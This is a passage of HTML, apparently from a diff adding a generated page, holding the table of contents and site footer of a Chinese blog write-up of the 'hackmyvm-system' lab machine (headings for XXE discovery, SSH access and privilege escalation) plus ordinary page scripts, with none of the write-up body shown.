href="#ssh%E8%BF%9E%E6%8E%A5"><span class="toc-number">1.6.</span> <span class="toc-text">ssh连接</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87"><span class="toc-number">1.7.</span> <span class="toc-text">权限提升</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%80%BB%E7%BB%93"><span class="toc-number">1.8.</span> <span class="toc-text">总结</span></a></li></ol></li></ol>
+      </div>
+    </aside>
+  
+</div>
+
+
+
+
+        
+          <div id="footer-post-container">
+  <div id="footer-post">
+
+    <div id="nav-footer" style="display: none">
+      <ul>
+        
+          <li><a href="/">首页</a></li>
+        
+          <li><a href="/archives/">归档</a></li>
+        
+          <li><a href="/tags/">标签</a></li>
+        
+          <li><a href="/categories/">分类</a></li>
+        
+          <li><a href="/links/">links</a></li>
+        
+          <li><a href="/about/">关于</a></li>
+        
+      </ul>
+    </div>
+
+    
+    
+    
+      <div id="toc-footer" style="display: none">
+        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#hackmyvm-system"><span class="toc-number">1.</span> <span class="toc-text">hackmyvm-system</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%B8%8B%E8%BD%BD%E5%9C%B0%E5%9D%80"><span class="toc-number">1.1.</span> <span class="toc-text">下载地址</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%AE%9E%E9%AA%8C%E7%8E%AF%E5%A2%83"><span class="toc-number">1.2.</span> <span class="toc-text">实验环境</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%B8%BB%E6%9C%BA%E5%8F%91%E7%8E%B0"><span class="toc-number">1.3.</span> <span class="toc-text">主机发现</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%AB%AF%E5%8F%A3%E6%8E%A2%E6%B5%8B"><span class="toc-number">1.4.</span> <span class="toc-text">端口探测</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#xxe%E6%BC%8F%E6%B4%9E%E5%8F%91%E7%8E%B0"><span class="toc-number">1.5.</span> <span class="toc-text">xxe漏洞发现</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#ssh%E8%BF%9E%E6%8E%A5"><span class="toc-number">1.6.</span> <span class="toc-text">ssh连接</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87"><span class="toc-number">1.7.</span> <span class="toc-text">权限提升</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%80%BB%E7%BB%93"><span class="toc-number">1.8.</span> <span class="toc-text">总结</span></a></li></ol></li></ol>
+      </div>
+    
+
+    <div id="share-footer" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://dgxddd.github.io/2023/03/24/hackmyvm-system/"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://dgxddd.github.io/2023/03/24/hackmyvm-system/&text=hackmyvm-system"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://dgxddd.github.io/2023/03/24/hackmyvm-system/&title=hackmyvm-system"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://dgxddd.github.io/2023/03/24/hackmyvm-system/&is_video=false&description=hackmyvm-system"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=hackmyvm-system&body=Check out this article: https://dgxddd.github.io/2023/03/24/hackmyvm-system/"><i class="fa-solid fa-envelope fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://dgxddd.github.io/2023/03/24/hackmyvm-system/&title=hackmyvm-system"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://dgxddd.github.io/2023/03/24/hackmyvm-system/&title=hackmyvm-system"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://dgxddd.github.io/2023/03/24/hackmyvm-system/&title=hackmyvm-system"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://dgxddd.github.io/2023/03/24/hackmyvm-system/&title=hackmyvm-system"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://dgxddd.github.io/2023/03/24/hackmyvm-system/&name=hackmyvm-system&description="><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://dgxddd.github.io/2023/03/24/hackmyvm-system/&t=hackmyvm-system"><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+
+    <div id="actions-footer">
+        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fa-solid fa-bars fa-lg" aria-hidden="true"></i> 菜单</a>
+        
+          <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fa-solid fa-list fa-lg" aria-hidden="true"></i> 目录</a>
+        
+        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fa-solid fa-share-alt fa-lg" aria-hidden="true"></i> 分享</a>
+        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up fa-lg" aria-hidden="true"></i> 返回顶部</a>
+    </div>
+
+  </div>
+</div>
+
+        
+        <footer id="footer">
+  <div class="footer-left">
+    Copyright &copy;
+    
+    
+    2016-2026
+    jxdgx
+  </div>
+  <div class="footer-right">
+    <nav>
+      <ul>
+        <!--
+       --><li><a href="/">首页</a></li><!--
+     --><!--
+       --><li><a href="/archives/">归档</a></li><!--
+     --><!--
+       --><li><a href="/tags/">标签</a></li><!--
+     --><!--
+       --><li><a href="/categories/">分类</a></li><!--
+     --><!--
+       --><li><a href="/links/">links</a></li><!--
+     --><!--
+       --><li><a href="/about/">关于</a></li><!--
+     -->
+      </ul>
+    </nav>
+  </div>
+</footer>
+
+    </div>
+    <!-- styles -->
+
+
+
+  <link rel="preload" as="style" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" crossorigin="anonymous" onload="this.onload=null;this.rel='stylesheet'"/>
+
+
+<link rel="stylesheet" href="/css/custom.css">
+
+    <!-- jquery -->
+
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js" crossorigin="anonymous"></script>
+
+
+
+
+<!-- clipboard -->
+
+  
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/clipboard.js/2.0.7/clipboard.min.js" crossorigin="anonymous"></script>
+  
+  <script type="text/javascript">
+  $(function() {
+    // copy-btn HTML
+    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"复制到粘贴板！\">";
+    btn += '<i class="fa-regular fa-clone"></i>';
+    btn += '</span>';
+    // mount it!
+    $(".highlight table").before(btn);
+    var clip = new ClipboardJS('.btn-copy', {
+      text: function(trigger) {
+        return Array.from(trigger.nextElementSibling.querySelectorAll('.code')).reduce((str,it)=>str+it.innerText+'\n','')
+      }
+    });
+    clip.on('success', function(e) {
+      e.trigger.setAttribute('aria-label', "复制成功！");
+      e.clearSelection();
+    })
+  })
+  </script>
+
+
+<script src="/js/main.js"></script>
+
+<!-- search -->
+
+<script src="/js/custom.js"></script>
+<!-- Baidu Analytics -->
+
+<!-- Cloudflare Analytics -->
+
+<!-- Disqus Comments -->
+
+<!-- utterances Comments -->
+
+
+</body>
+</html>
